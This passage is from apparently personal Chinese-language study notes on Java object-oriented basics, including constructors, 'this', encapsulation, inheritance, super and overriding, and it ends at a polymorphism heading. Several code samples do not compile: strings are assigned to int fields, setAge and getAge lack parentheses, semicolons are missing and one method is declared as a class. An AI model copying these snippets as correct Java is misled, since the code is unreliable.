class="string">&quot;3&quot;</span>;</span><br><span class="line">dog.color=<span class="string">&quot;4&quot;</span>;</span><br><span class="line"></span><br><span class="line">dog.eat();</span><br><span class="line">dog.sleep();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b43e8e1.png" alt="image-20240410104643287"></p><p>类(类型)是一种模板(1个) 根据类可以创建出多个对象(实例)</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac88a2b.png" alt="image-20240410104902803"></p><h3 id="方法与属性"><a href="#方法与属性" class="headerlink" title="方法与属性"></a>方法与属性</h3><p><strong>属性</strong></p><p>属性是有默认值的 所有在类的定义中可以不赋值 直接调用</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af9431b.png" alt="image-20240410105246809"></p><p>就近原则：谁离我近 谁对我起作用（作  用域更小的起作用）</p><p><strong>方法</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4abcde1a.png" alt="image-20240410105657665"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHi</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;---&quot;</span>+age+<span class="string">&quot;---&quot;</span>+sex+<span class="string">&quot;---&quot;</span>+score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个包实例化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s1.name=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">s1.age=<span class="string">&quot;3&quot;</span>;</span><br><span class="line">s1.sex=<span class="string">&quot;4&quot;</span>;</span><br><span class="line">s1.score=<span class="string">&quot;5&quot;</span>;</span><br><span class="line">    s1.sayHi();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Student s2=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s2.name=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s2.age=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">s2.sex=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">    s2.score=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">s2.sayHi();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>有些情况下，对象的同一种行为可能存在多种实现过程（吃饭与吃药 都是吃 但过程存在差异）</p><p>这样直接写的话会出现一个问题就是：方法名太多。而重载存在的意义就是解决方法名的问题 他允许一个方法名执行多个方法 <strong>根据传来的参数不同 执行不同的方法</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad3653a.png" alt="image-20240410111013681"></p><p><strong>注：参数要不同</strong>  <strong>与返回值类型无关      与形参名字无关</strong> </p><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4acc83d8.png" alt="image-20240410111327769"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b1d0105.png" alt="image-20240410111606491"></p><p>构造方法也可以重载，遵循重载规则</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b3c8570.png" alt="image-20240410111937961"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">String name;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">String sex;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String n,<span class="type">int</span> a,String s,<span class="type">int</span> sc)</span>&#123;</span><br><span class="line">name=n;</span><br><span class="line">age=a;</span><br><span class="line">sex=s;</span><br><span class="line">score=sc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;<span class="comment">//如果自己写了带参数的构造方法 要再写一个无参数的构造方法（习惯） 因为框架会调用</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHi</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(name+<span class="string">&quot;---&quot;</span>+age+<span class="string">&quot;---&quot;</span>+sex+<span class="string">&quot;---&quot;</span>+score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//另一个包实例化对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>,<span class="string">&quot;4&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    s1.sayHi();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Student s2=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">s2.name=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s2.age=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">s2.sex=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">    s2.score=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">s2.sayHi();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b567c59.png" alt="image-20240410112918317"></p><p><strong>用法1：</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b390f32.png" alt="image-20240410113039744"></p><p><strong>用法2：</strong></p><p>当两个构造方法当中，包含多条冗余代码时</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4aee8aad.png" alt="image-20240410113359968"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name,<span class="type">int</span> age,String sex)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.name=name;</span><br><span class="line"><span class="built_in">this</span>.age=age;</span><br><span class="line"><span class="built_in">this</span>.sex=sex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name,<span class="type">int</span> age,String sex,<span class="type">int</span> score)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>(name,age,sex);<span class="comment">//只能在第一行</span></span><br><span class="line"><span class="built_in">this</span>.score=score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在对象创建时 一旦分配空间 就已经存在this了 指向这个空间</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5a51d1.png" alt="image-20240413142319994"></p><p>本来这样是直接给age赋值 可能无意或恶意输入错误值 </p><p>所以用set get 方法</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5dec33.png" alt="image-20240413142545434"></p><p>这样将接受和赋值分开 可以让是否赋值的主动权在我们手中(可以判断)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Student s1=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.setAge(<span class="number">22000</span>);</span><br><span class="line">        System.out.println(s1.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Student</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    String gender;</span><br><span class="line">    <span class="type">double</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> setAge&#123;</span><br><span class="line">        <span class="keyword">if</span>(age&gt;=<span class="number">0</span>&amp;&amp;age&lt;=<span class="number">120</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.age=<span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> getAge&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae5b35c.png" alt="image-20240413154220187"></p><p>封装的好处：</p><ul><li>更安全</li><li>对外提供一个接口 更方便</li></ul><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>程序中的继承，是类与类之间特征和行为的一种赠与或获得</p><p>两个类之间的继承关系，必须满足”is a”的关系</p><p><strong>父类的选择：</strong></p><p>一个对象其实是有很多的父类</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac60878.png" alt="image-20240413155258258"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String strain;<span class="comment">//品种</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchDisk</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在玩飞盘&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStrain</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStrain</span><span class="params">(String strain)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.strain=strain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Penguin</span> <span class="keyword">extends</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String gender;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在游泳&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.gender=gender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        d.name=<span class="string">&quot;汪汪&quot;</span>;</span><br><span class="line">        System.out.println(d.name);</span><br><span class="line">        d.show();</span><br><span class="line">        <span class="type">Penguin</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        p.name=<span class="string">&quot;QQ&quot;</span>;</span><br><span class="line">        System.out.println(p.name);</span><br><span class="line">        p.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一组相同或类似的类中，抽取出共性的特征和行为，定义在父类中，实现重用</p><p><strong>子类通过extends来继承</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac245da.png" alt="image-20240417104444383"></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>单根性：一个类只能有一个直接的父类</p><p>传递性：类之间可以多级继承，属性和方法逐级叠加</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name +<span class="string">&quot;-&quot;</span>+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SE</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;coding&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">SE</span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dowork</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name +<span class="string">&quot;studying&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Student s=<span class="keyword">new</span> <span class="title class_">Student</span>;</span><br><span class="line">    s.name=<span class="string">&quot;Ozero&quot;</span>;</span><br><span class="line">    s.age=<span class="number">19</span>;</span><br><span class="line">    s.score =<span class="number">150</span>;</span><br><span class="line">    s.dowork();<span class="comment">//Student</span></span><br><span class="line">    s.show();<span class="comment">//Person</span></span><br><span class="line">    s.code();<span class="comment">//SE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过接口与内部类来实现多继承</p><h3 id="属性的继承"><a href="#属性的继承" class="headerlink" title="属性的继承"></a>属性的继承</h3><p>父类的所以属性都可以被继承</p><p>但是父类的私有属性不能被访问</p><p>当子类和父类有同名属性的时候可以通过super关键字区分</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ab3f62b.png" alt="image-20240417111831356"></p><p>sub继承sup </p><p>不加super–&gt;当前对象的属性</p><p>加super–&gt;父类被继承道子类的属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sup</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sub</span> <span class="keyword">extends</span> <span class="title class_">Sup</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> c=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> b=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">show</span>()&#123;</span><br><span class="line">        System.out.println(<span class="built_in">super</span>.b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    Sub sub=<span class="keyword">new</span> <span class="title class_">Sub</span>();</span><br><span class="line">    sub.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4ad04803.png" alt="image-20240417113146760"></p><p>默认是default</p><h3 id="方法的重写与覆盖"><a href="#方法的重写与覆盖" class="headerlink" title="方法的重写与覆盖"></a>方法的重写与覆盖</h3><p>如果父类提供的方法无法满足子类需求时，可在子类中定义和父类相同的方法进行重写(Override)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String strain;<span class="comment">//品种</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchDisk</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在玩飞盘&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>.show();</span><br><span class="line">        System.out.println(strain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStrain</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStrain</span><span class="params">(String strain)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.strain=strain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        d.name=<span class="string">&quot;汪汪&quot;</span>;</span><br><span class="line">        d.health=<span class="number">10</span>;</span><br><span class="line">        d.love=<span class="number">5</span>;</span><br><span class="line">        d.strain=<span class="string">&quot;修狗&quot;</span></span><br><span class="line">        d.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然 也可以不用 super.show(); 直接完全重写也行 但这时是默认default 所以可以直接访问</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love+<span class="string">&quot;-&quot;</span>+strain);</span><br></pre></td></tr></table></figure><p>但如果这时是private呢</p><p>肯定不能这样访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(getName()+&quot;-&quot;+getHealth()+&quot;-&quot;+getLove()+&quot;-&quot;+strain);</span><br></pre></td></tr></table></figure><p><strong>他把门关了，我们调用这个窗户就行</strong></p><p>当然 这里也要改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        d.setName(汪汪);</span><br><span class="line">        d.setHealth(<span class="number">10</span>);</span><br><span class="line">        d.setLove(<span class="number">5</span>);</span><br><span class="line">        d.strain=<span class="string">&quot;修狗&quot;</span></span><br><span class="line">        d.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果父类里strain也是private 也需要setStrain()</p><blockquote><p>方法重写的时候 访问权限可以放大 不能减小</p><p>返回值类型可以和父类一样，也可以是父类返回值类型的子类</p><p>方法名要一样</p><p>参数列表也必须相同</p><p>父类的私有的东西是不能被重写的</p></blockquote><p> <img src="https://bu.dusays.com/2024/05/13/6641a4b1cd1b5.png" alt="image-20240417161050813"></p><h3 id="继承中的对象创建"><a href="#继承中的对象创建" class="headerlink" title="继承中的对象创建"></a>继承中的对象创建</h3><p>在具有继承关系的对象创建中，构建子类对象会先调用父类构造</p><p>由父类的共性类容，叠加子类的独有内容，组合成完整的子类对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac09888.png" alt="image-20240417162049626"></p><p>只会调用父类的构造方法 而不会去创建父类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        C c=<span class="keyword">new</span> <span class="title class_">C</span>(<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line">        System.out.println(c.a+<span class="string">&quot;--&quot;</span>+c.b+<span class="string">&quot;--&quot;</span>+c.c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(<span class="type">int</span> a)</span>&#123;<span class="comment">//带参构造</span></span><br><span class="line">        <span class="built_in">this</span>.a=a;</span><br><span class="line">        System.out.println(<span class="string">&quot;A(int)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">(<span class="type">int</span> b,<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(a);</span><br><span class="line">        <span class="built_in">this</span>.b=b;</span><br><span class="line">        System.out.println(<span class="string">&quot;B(int,int)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="type">int</span> c=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">C</span><span class="params">(<span class="type">int</span> c,<span class="type">int</span> b,<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(a,b);</span><br><span class="line">        <span class="built_in">this</span>.c=c;</span><br><span class="line">        System.out.println(<span class="string">&quot;C(int,int,int)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>super()  表示调用父类无参构造</p><p>super(实参)   表示调用父类带参构造</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4b58af33.png" alt="image-20240417163817844"></p><h2 id="多态"><a href="#多态" 